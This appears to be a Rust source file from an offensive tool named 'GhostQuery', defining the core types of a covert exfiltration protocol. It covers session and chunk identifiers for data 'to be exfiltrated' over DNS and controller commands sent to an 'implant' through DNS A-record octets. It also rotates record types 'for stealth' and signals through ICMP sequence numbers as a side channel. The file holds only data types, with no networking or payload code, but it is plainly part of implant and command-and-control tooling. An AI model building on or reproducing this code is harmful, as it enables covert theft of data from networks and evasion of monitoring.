//! Core types used throughout the GhostQuery protocol.

use serde::{Deserialize, Serialize};
use std::fmt;

/// Unique identifier for a session (8 bytes / 64 bits)
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct SessionId([u8; 8]);

impl SessionId {
    /// Create a new random session ID
    pub fn new() -> Self {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let mut bytes = [0u8; 8];
        rng.fill(&mut bytes);
        Self(bytes)
    }

    /// Create from raw bytes
    pub fn from_bytes(bytes: [u8; 8]) -> Self {
        Self(bytes)
    }

    /// Get the raw bytes
    pub fn as_bytes(&self) -> &[u8; 8] {
        &self.0
    }

    /// Convert to hex string for DNS encoding
    pub fn to_hex(&self) -> String {
        hex::encode(self.0)
    }

    /// Parse from hex string
    pub fn from_hex(s: &str) -> Result<Self, hex::FromHexError> {
        let bytes = hex::decode(s)?;
        if bytes.len() != 8 {
            return Err(hex::FromHexError::InvalidStringLength);
        }
        let mut arr = [0u8; 8];
        arr.copy_from_slice(&bytes);
        Ok(Self(arr))
    }
}

impl Default for SessionId {
    fn default() -> Self {
        Self::new()
    }
}

impl fmt::Display for SessionId {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.to_hex())
    }
}

/// Chunk sequence identifier
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord, Serialize, Deserialize)]
pub struct ChunkId(pub u32);

impl ChunkId {
    pub fn new(id: u32) -> Self {
        Self(id)
    }

    pub fn as_u32(&self) -> u32 {
        self.0
    }

    pub fn next(&self) -> Self {
        Self(self.0 + 1)
    }
}

impl fmt::Display for ChunkId {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{:06}", self.0)
    }
}

impl From<u32> for ChunkId {
    fn from(id: u32) -> Self {
        Self(id)
    }
}

/// A chunk of data to be exfiltrated
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Chunk {
    /// Sequence number
    pub id: ChunkId,
    /// Encrypted and encoded data
    pub data: Vec<u8>,
    /// Whether this is the final chunk
    pub is_final: bool,
}

impl Chunk {
    pub fn new(id: ChunkId, data: Vec<u8>, is_final: bool) -> Self {
        Self { id, data, is_final }
    }
}

/// Control commands sent from controller to implant via DNS responses
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[repr(u8)]
pub enum Command {
    /// Acknowledge successful receipt (continue)
    Ack = 0,
    /// Request retransmission of a specific chunk (dirty bit)
    Retransmit = 1,
    /// Instruct implant to sleep for a duration
    Sleep = 2,
    /// Instruct implant to terminate session
    Terminate = 3,
    /// Session initialization acknowledged
    SessionAck = 4,
    /// Session complete, file verified
    Complete = 5,
    /// Error occurred
    Error = 6,
    /// Slow down transmission rate
    Throttle = 7,
    /// Resume normal transmission rate
    Resume = 8,
}

impl Command {
    /// Decode command from A record last octet
    pub fn from_octet(octet: u8) -> Option<Self> {
        match octet {
            0 => Some(Command::Ack),
            1 => Some(Command::Retransmit),
            2 => Some(Command::Sleep),
            3 => Some(Command::Terminate),
            4 => Some(Command::SessionAck),
            5 => Some(Command::Complete),
            6 => Some(Command::Error),
            7 => Some(Command::Throttle),
            8 => Some(Command::Resume),
            _ => None,
        }
    }

    /// Encode command to A record last octet
    pub fn to_octet(&self) -> u8 {
        *self as u8
    }
}

/// DNS record types used for multi-record rotation
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum DnsRecordType {
    A,
    AAAA,
    CNAME,
    MX,
    TXT,
}

impl DnsRecordType {
    /// Rotate to next record type for stealth
    pub fn next(&self) -> Self {
        match self {
            DnsRecordType::A => DnsRecordType::AAAA,
            DnsRecordType::AAAA => DnsRecordType::CNAME,
            DnsRecordType::CNAME => DnsRecordType::MX,
            DnsRecordType::MX => DnsRecordType::TXT,
            DnsRecordType::TXT => DnsRecordType::A,
        }
    }
}

/// File hash for integrity verification (SHA-256)
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct FileHash([u8; 32]);

impl FileHash {
    pub fn new(hash: [u8; 32]) -> Self {
        Self(hash)
    }

    pub fn from_slice(slice: &[u8]) -> Option<Self> {
        if slice.len() != 32 {
            return None;
        }
        let mut arr = [0u8; 32];
        arr.copy_from_slice(slice);
        Some(Self(arr))
    }

    pub fn as_bytes(&self) -> &[u8; 32] {
        &self.0
    }

    pub fn to_hex(&self) -> String {
        hex::encode(self.0)
    }

    pub fn from_hex(s: &str) -> Result<Self, hex::FromHexError> {
        let bytes = hex::decode(s)?;
        if bytes.len() != 32 {
            return Err(hex::FromHexError::InvalidStringLength);
        }
        let mut arr = [0u8; 32];
        arr.copy_from_slice(&bytes);
        Ok(Self(arr))
    }
}

impl fmt::Display for FileHash {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.to_hex())
    }
}

/// Session metadata for tracking exfiltration state
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionMetadata {
    /// Unique session identifier
    pub session_id: SessionId,
    /// Hash of the original file for verification
    pub file_hash: FileHash,
    /// Total number of chunks expected
    pub total_chunks: u32,
    /// Size of each chunk in bytes
    pub chunk_size: usize,
    /// Total file size in bytes
    pub file_size: u64,
}

impl SessionMetadata {
    pub fn new(
        session_id: SessionId,
        file_hash: FileHash,
        total_chunks: u32,
        chunk_size: usize,
        file_size: u64,
    ) -> Self {
        Self {
            session_id,
            file_hash,
            total_chunks,
            chunk_size,
            file_size,
        }
    }
}

/// Response from DNS query containing control information
#[derive(Debug, Clone)]
pub struct ControlResponse {
    /// Primary command
    pub command: Command,
    /// Optional chunk ID for retransmission
    pub chunk_id: Option<ChunkId>,
    /// Optional parameter (e.g., sleep duration in seconds)
    pub parameter: Option<u32>,
}

impl ControlResponse {
    pub fn ack() -> Self {
        Self {
            command: Command::Ack,
            chunk_id: None,
            parameter: None,
        }
    }

    pub fn retransmit(chunk_id: ChunkId) -> Self {
        Self {
            command: Command::Retransmit,
            chunk_id: Some(chunk_id),
            parameter: None,
        }
    }

    pub fn sleep(duration_secs: u32) -> Self {
        Self {
            command: Command::Sleep,
            chunk_id: None,
            parameter: Some(duration_secs),
        }
    }

    pub fn terminate() -> Self {
        Self {
            command: Command::Terminate,
            chunk_id: None,
            parameter: None,
        }
    }

    pub fn complete() -> Self {
        Self {
            command: Command::Complete,
            chunk_id: None,
            parameter: None,
        }
    }
}

/// ICMP signal types for side-channel communication
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum IcmpSignal {
    /// Open transmission window (acquire)
    WindowOpen,
    /// Close transmission window (release)
    WindowClose,
    /// Session initialization
    SessionInit,
    /// Session termination
    SessionEnd,
}

impl IcmpSignal {
    /// Encode signal into ICMP sequence number
    pub fn to_sequence(&self) -> u16 {
        match self {
            IcmpSignal::WindowOpen => 0x1001,
            IcmpSignal::WindowClose => 0x1002,
            IcmpSignal::SessionInit => 0x2001,
            IcmpSignal::SessionEnd => 0x2002,
        }
    }

    /// Decode signal from ICMP sequence number
    pub fn from_sequence(seq: u16) -> Option<Self> {
        match seq {
            0x1001 => Some(IcmpSignal::WindowOpen),
            0x1002 => Some(IcmpSignal::WindowClose),
            0x2001 => Some(IcmpSignal::SessionInit),
            0x2002 => Some(IcmpSignal::SessionEnd),
            _ => None,
        }
    }
}

